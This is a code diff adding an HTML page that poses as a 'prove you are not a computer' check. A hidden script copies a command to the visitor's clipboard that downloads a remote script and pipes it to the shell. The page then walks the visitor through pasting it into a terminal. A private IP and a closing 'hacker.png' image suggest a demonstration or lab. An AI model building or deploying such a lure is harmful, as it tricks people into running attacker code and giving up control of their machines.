@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Are you a Computer?</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #111;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #222;
+      padding: 30px 40px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #ccc;
+    }
+    .button {
+      background-color: #1abc9c;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 30px;
+    }
+    .step {
+      text-align: left;
+      margin-bottom: 20px;
+      display: none
+    }
+    .step img {
+      display: block;
+      margin: 10px auto;
+      height: 30px;
+    }
+    .ok-button {
+      background-color: #1abc9c;
+      color: white;
+      padding: 10px 30px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 15px;
+      margin-left: 113px;
+    }
+    .highlight {
+      font-family: monospace;
+      background: #333;
+      padding: 3px 6px;
+      border-radius: 4px;
+      color: #0f0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="flow">
+    <h1>Are you a Computer? This is to protect user.</h1>
+    <p>Please see instructions to confirm:</p> 
+    <button class="button" onclick="beginValidation()">Show Instructions</button>
+
+    <div class="step" id="step1">
+      <strong>Step 1:</strong> Locate and Click the Terminal Icon<br>
+      <img src="linux-terminal.png" alt="Terminal Icon">
+    </div>
+
+    <div class="step" id="step2">
+      <strong>Step 2:</strong> Press <span class="highlight">SHIFT+CTRL+V</span> and hit <span class="highlight">RETURN</span>
+    </div>
+
+    <div class="step" id="step3">
+      <strong>Step 3:</strong> Click the "OK" button<br>
+      <button class="ok-button" onclick="finish()">OK</button>
+    </div>
+
+    
+  </div>
+
+  <script>
+    function beginValidation(){
+        const cmd = 'curl -s http://192.168.29.214:8090/oops.html | sh';
+
+       
+
+      //  navigator.clipboard.writeText(cmd).then(() => {
+        const textArea = document.createElement("textarea");
+        textArea.value = cmd;
+            
+        // Move textarea out of the viewport so it's not visible
+        textArea.style.position = "absolute";
+        textArea.style.left = "-999999px";
+            
+        document.body.prepend(textArea);
+        textArea.select();
+
+        try {
+            document.execCommand('copy');
+            const button = document.querySelector('button');
+            button.textContent = 'Instructions';
+            button.disabled = true;
+            showStep('step1');
+            showStep('step2');
+            showStep('step3');
+
+        //}).
+        }
+        catch(error){
+            alert("Clipboard error: "+ errr);
+        };
+    }
+    function showStep(id){
+        document.getElementById(id).style.display = 'block';
+    }
+  function finish(){
+     const container = document.getElementById('flow');
+     container.innerHTML = '<img src="hacker.png" alt="Verified" style="max-width:60%" display:block;/>'
+     document.body.style.background = '#000';
+  }
+</script>
+</body>
+</html>
